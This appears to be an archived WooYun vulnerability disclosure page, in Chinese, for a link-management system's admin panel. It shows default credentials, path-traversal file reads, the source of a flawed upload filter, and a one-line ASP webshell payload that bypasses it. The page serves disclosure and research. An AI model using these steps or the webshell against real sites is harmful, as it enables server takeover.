@@ -1,0 +1,281 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		传承链接管理系统后台存在任意文件读取漏洞+上传检查不严谨可Getshell（读取源码逻辑绕过限制）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		传承链接管理系统后台存在任意文件读取漏洞+上传检查不严谨可Getshell（读取源码逻辑绕过限制）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/HRay">HRay</a> 
+</li><li>提交时间：		2013-08-15 18:14</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-15：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-16：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-08-19：	细节向第三方安全合作伙伴开放<br/>
+									2013-08-26：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-09-05：	细节向普通白帽子公开<br/>
+									2013-09-25：	细节向实习白帽子公开<br/>
+									2013-11-13：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">传承旗下-哇哇网址存在弱口令可进入后台续-忽视真的不代表没问题</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">习惯性的点开“对我公开的漏洞”,发现 <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-027247">WooYun: 传承旗下-哇哇网址存在弱口令可进入后台</a> <br />
+<br />
+然后看到厂商回复“根本就上传不了，还有这个是演示后台弱口令正常，并没有使用的!”<br />
+<br />
+ok，既然是后台演示，那咱就进去看看，是否能拿到shell<br />
+<br />
+访问http://pplms.cn/x/admin/IndexManage.asp  admin  admin888进入后台<br />
+<br />
+长话短说，直接上问题<br />
+<br />
+<br />
+<br />
+1.模板管理处对CurrPath参数过滤不当导致可以遍历上级目录<br />
+<br />
+http://pplms.cn/x/admin/Template/TemplateManage.asp?CurrPath=%2Fx%2F<br />
+<br />
+</p><p class="detail"><a href="../images/151452413c4ee13f07af3c3515e5a96f5c24e448.jpg" target="_blank"><img src="../images/151452413c4ee13f07af3c3515e5a96f5c24e448.jpg" alt="1_列目录.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+也可以直接查看文件内容，如<br />
+<br />
+http://pplms.cn/x/admin/Template/Template.asp?Action=Modify&amp;FileName=Config%2Easp&amp;CurrPath=%2Fx%2FConfig<br />
+<br />
+</p><p class="detail"><a href="../images/1514540686fa56f1fb118a9363acde393b7bbccd.jpg" target="_blank"><img src="../images/1514540686fa56f1fb118a9363acde393b7bbccd.jpg" alt="2_config.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+按说这里应该是编辑内容的，但是限制了可保存的文件名，文件名不能出现; 并且路径中也不能出现x.asp这种，就算你建立了x.asp这样的目录也不能在这里拿shell<br />
+<br />
+<br />
+<br />
+2.结合1，虽然不能直接拿shell，但是支持我们新建一个1.asp的目录名，系统本身有上传文件管理的功能<br />
+<br />
+</p><p class="detail"><a href="../images/15145923a1d5fdc698430579a53e4660ba8ce41d.jpg" target="_blank"><img src="../images/15145923a1d5fdc698430579a53e4660ba8ce41d.jpg" alt="_上传文件管理.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+我开始的想法是直接传jpg到1.asp目录里，但是文件内容也有检查限制<br />
+<br />
+</p><p class="detail"><a href="../images/1514595326faf13a4c5950ac7908436c05498565.jpg" target="_blank"><img src="../images/1514595326faf13a4c5950ac7908436c05498565.jpg" alt="_上传限制.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+我们利用漏洞1读一下相关的代码，文件类型限制之类的就不看了，只看内容检查的地方,代码如下<br />
+<br />
+</p><pre><code>&#039;检查文件内容的是否合法<br />
+Function  CheckFileContent(byval path,byval FileSize)<br />
+    Dim kk,NoAllowExtArr<br />
+	NoAllowExtArr=Split(NoAllowExt,&quot;|&quot;)<br />
+	For kk=0 To Ubound(NoAllowExtArr)<br />
+	    If InStr(LCase(path),&quot;.&quot; &amp; NoAllowExtArr(kk))&lt;&gt;0 Then<br />
+		   Call PCls.DeleteFile(path)&#039;删除指定文件<br />
+		   CheckFileContent= &quot;文件上传失败,文件名不合法&quot;<br />
+		   Exit Function<br />
+		End If<br />
+	Next<br />
+	If FileSize&gt;50 Then Exit Function  &#039;超过50K跳过检测<br />
+	<br />
+	On Error Resume Next<br />
+	Dim FindContent,regEx,FoundTF<br />
+	FindContent=PCls.ReadFromFile(Replace(path,PCls.Setting(2),&quot;&quot;))<br />
+	If Err Then Exit Function:Err.Clear<br />
+	FoundTF=false<br />
+	Set regEx = New RegExp<br />
+	regEx.IgnoreCase = True<br />
+	regEx.Global = True<br />
+	<br />
+	regEx.Pattern = &quot;@\s*LANGUAGE\s*=\s*[&quot;&quot;]?\s*(vbscript|jscript|javascript).encode\b&quot;<br />
+	If regEx.Test(FindContent) Then<br />
+	   FoundTF=true<br />
+	End If<br />
+	regEx.Pattern = &quot;execute\s*request&quot;<br />
+	If regEx.Test(FindContent) Then<br />
+	   FoundTF=true<br />
+	End If<br />
+	regEx.Pattern = &quot;executeglobal\s*request&quot;<br />
+	If regEx.Test(FindContent) Then<br />
+	   FoundTF=true<br />
+	End If<br />
+	regEx.Pattern = &quot;&lt;script.*runat.*server(\n|.)*execute(\n|.)*&lt;\/script&gt;&quot;<br />
+	If regEx.Test(FindContent) Then<br />
+	   FoundTF=true<br />
+	End If<br />
+	regEx.Pattern = &quot;\&lt;%(.|\n)*%\&gt;&quot;<br />
+	If regEx.Test(FindContent) Then<br />
+	   FoundTF=true<br />
+	End If<br />
+	If InStr(LCase(FindContent),&quot;scripting.filesystemobject&quot;)&lt;&gt;0 or instr(lcase(FindContent),&quot;adodb.stream&quot;)&lt;&gt;0 Then<br />
+	   FoundTF=true<br />
+	End If<br />
+	Set regEx=nothing<br />
+	If FoundTF Then<br />
+	   PCls.DeleteFile(path)<br />
+	   CheckFileContent=&quot;系统检查到您上传的文件可能存在危险代码，不允许上传！&quot;<br />
+	End If	<br />
+End Function</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这里我们有两种绕过的方法<br />
+<br />
+<br />
+<br />
+1是直接上传一个大于50k的<br />
+<br />
+2是上传如下代码的一句话<br />
+<br />
+</p><pre><code>&lt;script language=VBScript runat=server&gt;eval request(&quot;a&quot;)&lt;/Script&gt;</code></pre><p class='detail'><br />
+<br />
+正则匹配忽略了大小写<br />
+<br />
+<br />
+<br />
+两种方式我们均上传成功<br />
+<br />
+但是我发现默认会生成一个1asp的文件夹，而并非长传至1.asp，这个简单，利用模板管理的强大功能，把1asp目录重命名为1.asp就ok了<br />
+<br />
+<br />
+<br />
+最终拿到了webshell<br />
+<br />
+</p><p class="detail"><a href="../images/15150516f4c72c197ff4d409897836e528624fbd.jpg" target="_blank"><img src="../images/15150516f4c72c197ff4d409897836e528624fbd.jpg" alt="_webshell.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/15150516f4c72c197ff4d409897836e528624fbd.jpg" target="_blank"><img src="../images/15150516f4c72c197ff4d409897836e528624fbd.jpg" alt="_webshell.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">厂商还是有一定的安全意识的，如何修复我想也不用我多说了 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/HRay" title="HRay">HRay</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-034434" title="传承链接管理系统后台存在任意文件读取漏洞+上传检查不严谨可Getshell（读取源码逻辑绕过限制）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-08-16 15:34</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">谢谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="34434";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
